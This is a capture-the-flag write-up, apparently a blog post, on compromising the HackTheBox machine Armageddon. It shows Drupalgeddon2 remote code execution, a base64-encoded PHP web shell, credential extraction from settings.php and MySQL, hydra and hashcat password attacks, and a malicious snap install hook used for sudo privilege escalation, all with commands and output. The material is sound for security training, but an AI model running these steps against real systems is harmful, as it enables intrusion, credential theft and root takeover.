---
layout: single
title: Armageddon (HTB)
toc: true
permalink: /htb/armageddon
tags: ["htb"]
---

# nmap

```sh
# Nmap 7.92 scan initiated Tue Dec 28 20:02:10 2021 as: nmap -sCV -oN armageddon 10.10.10.233
Nmap scan report for 10.10.10.233
Host is up (0.079s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to  Armageddon |  Armageddon
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec 28 20:02:22 2021 -- 1 IP address (1 host up) scanned in 11.99 seconds
```

## key findings

From the `nmap` scan and an extension called `wappalyzer`, I found the following:

- Drupal 7
- Apache 2.4.6
- CentOS
- PHP 5.4.16
- jQuery 1.4.4

# gobuster

```sh
[tyco㉿4YE: ~/htb/armageddon/scans]$ gobuster dir -u http://10.10.10.233 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster -x sh,txt,php -k

/index.php            (Status: 200) [Size: 7440]
/misc                 (Status: 301) [Size: 233] [--> http://10.10.10.233/misc/]
/themes               (Status: 301) [Size: 235] [--> http://10.10.10.233/themes/]
/modules              (Status: 301) [Size: 236] [--> http://10.10.10.233/modules/]
/scripts              (Status: 301) [Size: 236] [--> http://10.10.10.233/scripts/]
/sites                (Status: 301) [Size: 234] [--> http://10.10.10.233/sites/]
/includes             (Status: 301) [Size: 237] [--> http://10.10.10.233/includes/]
/install.php          (Status: 200) [Size: 3172]
/profiles             (Status: 301) [Size: 237] [--> http://10.10.10.233/profiles/]
/update.php           (Status: 403) [Size: 4057]
/README.txt           (Status: 200) [Size: 5382]
/robots.txt           (Status: 200) [Size: 2189]
/cron.php             (Status: 403) [Size: 7388]
/INSTALL.txt          (Status: 200) [Size: 17995]
/LICENSE.txt          (Status: 200) [Size: 18092]
/CHANGELOG.txt        (Status: 200) [Size: 111613]
/xmlrpc.php           (Status: 200) [Size: 42]
/COPYRIGHT.txt        (Status: 200) [Size: 1481]
/UPGRADE.txt          (Status: 200) [Size: 10123]
/authorize.php        (Status: 403) [Size: 2824]
```

# enumeration

From the `gobuster` scan, I saw that that `README.txt` and `/INSTALL.txt` showed up. These files are a good finding because they may clue you into what software is being installed. The two files show that Drupal is installed. Wappalyzer and the `nmap` scan also show Drupal as well.

```
ABOUT DRUPAL
------------

Drupal is an open source content management platform supporting a variety of
websites ranging from personal weblogs to large community-driven websites...
```

```
REQUIREMENTS AND NOTES
----------------------

Drupal requires:

- A web server. Apache (version 2.0 or greater) is recommended.
- PHP 5.2.4 (or greater) (http://www.php.net/).
- One of the following databases:
  - MySQL 5.0.15 (or greater) (http://www.mysql.com/).
  - MariaDB 5.1.44 (or greater) (http://mariadb.org/). MariaDB is a fully
    compatible drop-in replacement for MySQL.
  - Percona Server 5.1.70 (or greater) (http://www.percona.com/). Percona
    Server is a backwards-compatible replacement for MySQL.
  - PostgreSQL 8.3 (or greater) (http://www.postgresql.org/).
  - SQLite 3.3.7 (or greater) (http://www.sqlite.org/).
```

# exploitation

Based on my enumeration and the title of the box, I was guessing that it was related to Drupalgeddon.

There were two ways I got RCE. One was through a [python script](https://github.com/pimps/CVE-2018-7600) that allowed command execution one at a time, and a [ruby script](https://github.com/dreadlocked/Drupalgeddon2) that spawned an interactive shell. I will talk about the ruby script later, since I thought it did not work when I tried it initially.

## drupal SQL injection

[https://www.exploit-db.com/exploits/34992](https://www.exploit-db.com/exploits/34992 ) did not work.

```sh
[tyco㉿4YE: ~/htb/armageddon]$ python 34992.py -t http://10.10.10.233 -u admin -p hehe 

  ______                          __     _______  _______ _____    
 |   _  \ .----.--.--.-----.---.-|  |   |   _   ||   _   | _   |   
 |.  |   \|   _|  |  |  _  |  _  |  |   |___|   _|___|   |.|   |   
 |.  |    |__| |_____|   __|___._|__|      /   |___(__   `-|.  |   
 |:  1    /          |__|                 |   |  |:  1   | |:  |   
 |::.. . /                                |   |  |::.. . | |::.|   
 `------'                                 `---'  `-------' `---'   
  _______       __     ___       __            __   __             
 |   _   .-----|  |   |   .-----|__.-----.----|  |_|__.-----.-----.
 |   1___|  _  |  |   |.  |     |  |  -__|  __|   _|  |  _  |     |
 |____   |__   |__|   |.  |__|__|  |_____|____|____|__|_____|__|__|
 |:  1   |  |__|      |:  |    |___|                               
 |::.. . |            |::.|                                        
 `-------'            `---'                                        
                                                                   
                                 Drup4l => 7.0 <= 7.31 Sql-1nj3ct10n
                                              Admin 4cc0unt cr3at0r

								...

[X] NOT Vulnerable :(
```

## CVE-2018-7600: unauthenticated RCE

RCE worked! However, I could only run one commands at a time.

### system enumeration

`id` command to show username and groups that the user is in:

```sh
[tyco㉿4YE: ~/htb/armageddon/CVE-2018-7600]$ python3 drupa7-CVE-2018-7600.py http://10.10.10.233 -c id

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-HI3tCqcRxYMPU9PjIrnTYgFIgboG-2rZroSL6prkiQ8
[*] Triggering exploit to execute: id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
```

`cat /etc/passwd` to enumerate user. I found that the user was `brucetherealadmin`:

```sh
[tyco㉿4YE: ~/htb/armageddon/CVE-2018-7600]$ python3 drupa7-CVE-2018-7600.py http://10.10.10.233 -c "cat /etc/passwd"  

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-4jt4KLiVoZURl5svnu6VqwkZPHu1vYrkYccP2FFbZSE
[*] Triggering exploit to execute: cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
```

`ss -peanut` to see running ports on the system:

```sh
[tyco㉿4YE: ~/htb/armageddon/CVE-2018-7600]$ python3 drupa7-CVE-2018-7600.py http://10.10.10.233 -c "ss -peanut"                                                                    

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-KNaN-SgE3YhyBFWaqr_7GLAq17ALoRScossv-8a5EaU
[*] Triggering exploit to execute: ss -peanut
Netid  State      Recv-Q Send-Q Local Address:Port               Peer Address:Port    Process          
tcp    LISTEN     0      0      *:22                    		 *:*                  ino:18771 sk:0
tcp    LISTEN     0      0      127.0.0.1:25                     *:*                  ino:20522 sk:0
tcp    LISTEN     0      0      127.0.0.1:3306                   *:*                  uid:27 ino:20726 sk:0
tcp    ESTAB      0      0      10.10.10.233:22                  10.10.14.10:56530    timer:(keepalive,73min,0) ino:61650 sk:0
tcp    LISTEN     0      0      [::]:22                 		 [::]:*               ino:18774 sk:0
tcp    LISTEN     0      0      [::1]:25                		 [::]:*               ino:20523 sk:0
tcp    LISTEN     0      0      [::]:80                 		 [::]:*               ino:18379 sk:0
```

Aside from enumerating the files in `/var/www/html`, I actually skipped everything by accident. When I was looking through different directories in `/`, I did not find anything useful. What was more strange was that nothing from `/home` would show up. Even running `cat /home/brucetherealadmin/user.txt` would not show the flag. This was probably intended but it left me stumped.

I saw that MySQL was running locally, but I could not connect to the database. I thought this was a rabbit hole, so I moved on pretty quickly after it returned nothing.

```sh
[tyco㉿4YE: ~/htb/armageddon/CVE-2018-7600]$ python3 drupa7-CVE-2018-7600.py http://10.10.10.233 -c "mysql -u root -p"

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-iwkC1kWnWmS7wlI5gFL2c-hEKRTG_GKRkzY2Hc1bFas
[*] Triggering exploit to execute: mysql -u root -p
```

Without a way to see the home directory, I was confused what I was supposed to do next. It was odd that I could not access the home directory. I kept enumerating the system but could not find any passwords (*ha*) that I could try to use to SSH into the user `brucetherealadmin`. The next logical step in my mind was bruteforcing, but I was a bit hesitant because I was questioning if that was the intended path of the box. I'm not a big fan of guessing passwords on HackTheBox (like Nibbles). I ended up trying it out in the background as I continued enumerating the system, AND IT WORKED!

```sh
[tyco㉿4YE: ~/htb/armageddon]$ hydra -l brucetherealadmin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.233

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-28 21:40:13
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.10.233:22/
[STATUS] 181.00 tries/min, 181 tries in 00:01h, 14344223 to do in 1320:50h, 16 active

[22][ssh] host: 10.10.10.233   login: brucetherealadmin   password: booboo

1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-28 21:41:51
```

# snap exploit

## what is it?

`snap` is package manager similar to `apt`, developed by Canonical (Ubuntu). `snap` was created as a way to have cross-platform packages that could be used across many Linux distributions. Snaps are different from normal packages however, because they are sandboxed applications that are bundled with their own dependencies. This makes snap packages easy to install and use. These packages have a `.snap` extension and is a filesystem containing the application itself, libraries, dependencies, and metadata. It is compressed with `SquashFS`, so you can run `unsquash -ll <snap package>` to see the contents inside a snap package.

```sh
[tyco㉿4YE: ~/htb/armageddon/snap]$ unsquashfs -ll test.snap 
drwxr-xr-x root/root                27 2021-12-29 11:42 squashfs-root
drwxr-xr-x root/root                45 2021-12-29 11:42 squashfs-root/meta
drwxr-xr-x root/root                30 2021-12-29 11:42 squashfs-root/meta/hooks
-rwxr-xr-x root/root                35 2021-12-29 11:42 squashfs-root/meta/hooks/install
-rw-r--r-- root/root               147 2021-12-29 11:42 squashfs-root/meta/snap.yaml
```

## exploitation

With the password bruteforced, we can now SSH into the box, and run `sudo -l` to see what commands the user can run.

```sh
[brucetherealadmin@armageddon ~]$ sudo -l

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

I was not familiar with how to exploit this, so I went to [GTFOBins](https://gtfobins.github.io/gtfobins/snap/) to see if `snap` was a binary that could be used to escalate privileges. 

Since the user `brucetherealadmin` can install any snap packages as `root` without authentication, we are going to create a custom snap package that will do what we will need to escalate privileges. GTFOBins had the PoC laid out. I just ran each command line-by-line, with the modification of the `COMMAND` variable and hosted it on a Python HTTP server to transfer the file over.

```bash
(1) > COMMAND="cat /root/root.txt"
(2) > mkdir -p meta/hooks
(3) > printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
(4) > chmod +x meta/hooks/install
(5) > fpm -n xxxx -s dir -t snap -a all meta

> python3 -m http.server
```

To break it down, we're creating a malicious package, and all it is doing is running a command as the `root` user. 

1. `COMMAND="cat /root/root.txt"` will set up the `COMMAND` variable. I want the variable to read the flag in `root.txt`.

2. `mkdir -p meta/hooks` is going to make 2 directories at once. `meta` is the parent directory, and `hooks` is the child directory inside it.

3. `printf` will print `'#!/bin/sh\n%s; false' "$COMMAND"` and redirect the output to a file called `install` inside the `hooks` directory. The `install` file is a bash script, so when the snap package gets installed, it will run the hook and read us the root flag.

   ```bash
   [tyco㉿4YE: ~/htb/armageddon/snap]$ cat meta/hooks/install     
   
   #!/bin/sh
   cat /root/root.txt; false
   ```

4. `chmod +x meta/hooks/install` will make the script world executable. When the hook is called, the executable bit (the `x` in `-rwxr-xr-x`) will allow it to run the script.

   ```sh
   -rwxr-xr-x root/root                35 2021-12-29 11:42 squashfs-root/meta/hooks/install
   ```

5. `fpm -n xxxx -s dir -t snap -a all meta` will package everything up into a snap package.

   1. `-n` : the name to give to the package
   2. `-s` : the package type to use as input (gem, rpm, python, etc)
   3. `-t` : the type of package you want to create (deb, rpm, solaris, etc)
   4. `-a` : the architecture name. Usually matches `uname -m`.

Now all there is to do is to transfer the snap package over to the box, and install it.

```sh
[brucetherealadmin@armageddon ~]$ curl http://10.10.14.10:8000/xxxx_1.0_all.snap -o xxxx_1.0_all.snap
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  4096  100  4096    0     0  24718      0 --:--:-- --:--:-- --:--:-- 24824

[brucetherealadmin@armageddon ~]$ sudo /usr/bin/snap install xxxx_1.0_all.snap --dangerous --devmode
error: cannot perform the following tasks:
- Run install hook of "xxxx" snap if present (run hook "install": [REDACTED])
```

# revisiting the right way to do it

## dreadlocked/Drupalgeddon2

At first, I thought it did not work since the ruby file errored out, so that is why I moved on to the Python script.

```sh
[tyco㉿4YE: ~/htb/armageddon/Drupalgeddon2]$ ./drupalgeddon2.rb http://10.10.10.233

Traceback (most recent call last):
        2: from ./drupalgeddon2.rb:16:in `<main>'
        1: from /usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in `require'
/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in `require': cannot load such file -- highline/import (LoadError)
```

However, the [troubleshooting](https://github.com/dreadlocked/Drupalgeddon2#troubleshooting) section for the repo has a fix for this specific error:

> Whenever getting a "*cannot load such file* ... (LoadError)" type of error, do run `sudo gem install <missing dependency>`. In particular, you may need to install the *highline* dependency with `sudo gem install highline`

This issue can be fixed by installing a ruby gem called `highline`.

```sh
[tyco㉿4YE: ~/htb/armageddon/Drupalgeddon2]$ sudo gem install highline
[sudo] password for tyco: 

Fetching highline-2.0.3.gem
Successfully installed highline-2.0.3
Parsing documentation for highline-2.0.3
Installing ri documentation for highline-2.0.3
Done installing documentation for highline after 2 seconds
1 gem installed
```

Now run the ruby script again, and it should work and create an interactive shell for you. This exploit is much better than the python script above since we actually have an interactive shell.

```sh
[tyco㉿4YE: ~/htb/armageddon/Drupalgeddon2]$ ./drupalgeddon2.rb http://10.10.10.233
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://10.10.10.233/
--------------------------------------------------------------------------------
[+] Found  : http://10.10.10.233/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.56
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[!] Result : Clean URLs disabled (HTTP Response: 404)
[i] Isn\'t an issue for Drupal v7.x
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo EADOSKML
[+] Result : EADOSKML
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://10.10.10.233/shell.php)
[i] Response: HTTP 404 // Size: 5
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl 'http://10.10.10.233/shell.php' -d 'c=hostname'
armageddon.htb>>
```

### system enumeration using the Druppalgeddon2 shell

I saw `settings.php` while enumerating the website, but it did not load on Firefox, and I did not give it a second thought. If I kept of the files that would not render on Firefox, I could've taken a second look at it when I got on the box and found the Drupal credentials when I was enumerating this directory initially.

```sh
armageddon.htb>> pwd

/var/www/html
```

```sh
armageddon.htb>> ls -la

total 288  
drwxr-xr-x.  9 apache apache   4096 Dec 29 05:34 .
drwxr-xr-x.  4 root   root       33 Dec  3  2020 ..
-rw-r--r--.  1 apache apache    317 Jun 21  2017 .editorconfig
-rw-r--r--.  1 apache apache    174 Jun 21  2017 .gitignore 
-rw-r--r--.  1 apache apache   6112 Jun 21  2017 .htaccess
-rw-r--r--.  1 apache apache 111613 Jun 21  2017 CHANGELOG.txt
-rw-r--r--.  1 apache apache   1481 Jun 21  2017 COPYRIGHT.txt
-rw-r--r--.  1 apache apache   1717 Jun 21  2017 INSTALL.mysql.txt
-rw-r--r--.  1 apache apache   1874 Jun 21  2017 INSTALL.pgsql.txt
-rw-r--r--.  1 apache apache   1298 Jun 21  2017 INSTALL.sqlite.txt
-rw-r--r--.  1 apache apache  17995 Jun 21  2017 INSTALL.txt
-rw-r--r--.  1 apache apache  18092 Nov 16  2016 LICENSE.txt
-rw-r--r--.  1 apache apache   8710 Jun 21  2017 MAINTAINERS.txt
-rw-r--r--.  1 apache apache   5382 Jun 21  2017 README.txt 
-rw-r--r--.  1 apache apache  10123 Jun 21  2017 UPGRADE.txt
-rw-r--r--.  1 apache apache   6604 Jun 21  2017 authorize.php
-rw-r--r--.  1 apache apache    720 Jun 21  2017 cron.php
drwxr-xr-x.  4 apache apache   4096 Jun 21  2017 includes
-rw-r--r--.  1 apache apache    529 Jun 21  2017 index.php                                                            
-rw-r--r--.  1 apache apache    703 Jun 21  2017 install.php
drwxr-xr-x.  4 apache apache   4096 Dec  4  2020 misc
drwxr-xr-x. 42 apache apache   4096 Jun 21  2017 modules
drwxr-xr-x.  5 apache apache     70 Jun 21  2017 profiles
-rw-r--r--.  1 apache apache   2189 Jun 21  2017 robots.txt        
drwxr-xr-x.  2 apache apache    261 Jun 21  2017 scripts
-rw-r--r--.  1 apache apache     75 Dec 29 05:34 shell.php                                                            
drwxr-xr-x.  4 apache apache     75 Jun 21  2017 sites
drwxr-xr-x.  7 apache apache     94 Jun 21  2017 themes
-rw-r--r--.  1 apache apache  19986 Jun 21  2017 update.php 
-rw-r--r--.  1 apache apache   2200 Jun 21  2017 web.config 
-rw-r--r--.  1 apache apache    417 Jun 21  2017 xmlrpc.php
```

```sh
armageddon.htb>> ls -la sites                                                                                         
total 12                                                                                                              
drwxr-xr-x. 4 apache apache   75 Jun 21  2017 .                                                                       
drwxr-xr-x. 9 apache apache 4096 Dec 29 05:34 ..                                                                      
-rw-r--r--. 1 apache apache  904 Jun 21  2017 README.txt                                                              
drwxr-xr-x. 5 apache apache   52 Jun 21  2017 all                                                                     
dr-xr-xr-x. 3 apache apache   67 Dec  3  2020 default                                                                 
-rw-r--r--. 1 apache apache 2365 Jun 21  2017 example.sites.php                                                       

armageddon.htb>> ls -la sites/default                                                                                 
total 56                                                                                                              
dr-xr-xr-x. 3 apache apache    67 Dec  3  2020 .                                                                      
drwxr-xr-x. 4 apache apache    75 Jun 21  2017 ..                                                                     
-rw-r--r--. 1 apache apache 26250 Jun 21  2017 default.settings.php                                                   
drwxrwxr-x. 3 apache apache    37 Dec  3  2020 files                                                                  
-r--r--r--. 1 apache apache 26565 Dec  3  2020 settings.php                                                           
```

```php
armageddon.htb>> cat sites/default/settings.php

$databases = array (                                                                                                  
  'default' =>                                                                                                        
  array (                                                                                                             
    'default' =>                                                                                                      
    array (                                                                                                           
      'database' => 'drupal',                                                                                         
      'username' => 'drupaluser',                                                                                     
      'password' => 'CQHEy@9M*m23gBVj',                                                                               
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

We know there is MySQL running on the system locally, so let's authenticate with the Drupal credentials we found.

## mysql

At first, I was confused because I could not authenticate:

```sh
armageddon.htb>> mysql -u drupaluser -p CQHEy@9M*m23gBVj 
Enter password: ERROR 1045 (28000): Access denied for user 'drupaluser'@'localhost' (using password: NO)
```

A quick google search led me to this [Stack Overflow](https://stackoverflow.com/questions/5131931/connecting-to-mysql-from-the-command-line) page. I entered the password again without any space between `-p` and the password and it worked!

```sh
-p: password (**no space between -p and the password text**)
```

Used credentials to log into `MySQL`:

```sh
armageddon.htb>> mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'show databases;'                                           

Database
information_schema
drupal                                                                                                                
mysql
performance_schema
```

Further enumeration of the `drupal` database:

```sh
armageddon.htb>> mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; show tables;\G'

Tables_in_drupal
...
users
...
```

Getting everything from the `users` table (Append `\G` to the end of your SQL query but before the `;` to print the output in vertical rows for readability):

```sh
armageddon.htb>> mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; select * from users\G;'

             uid: 1   
            name: brucetherealadmin
            pass: $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
            mail: admin@armageddon.eu
           theme: 
       signature: 
signature_format: filtered_html
         created: 1606998756
          access: 1607077194
           login: 1607076276
          status: 1
        timezone: Europe/London
        language: 
         picture: 0
            init: admin@armageddon.eu
            data: a:1:{s:7:"overlay";i:1;}
```

Searching for the hash shows that it is a Drupal7 hash. Let's use `hashcat` to see if the password can be cracked.

| Hash-Mode | Hash-Name | Example                                                 |
| --------- | --------- | ------------------------------------------------------- |
| 7900      | Drupal7   | $S$C33783772bRXEx1aCsvY.dqgaaSu76XmVlKrW9Qu8IQlvxHlmzLf |

`hashcat` cracked the hash, and the password is `booboo`. From out previous enumeration, we know the credentials are `brucetherealadmin:booboo` now.

```
[tyco㉿4YE: ~/htb/armageddon]$ hashcat -m 7900 hash.txt /usr/share/wordlists/rockyou.txt

$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo
```

With the password hash cracked, you can SSH into the box as `brucetherealadmin`, and run the snap exploit to root the box.

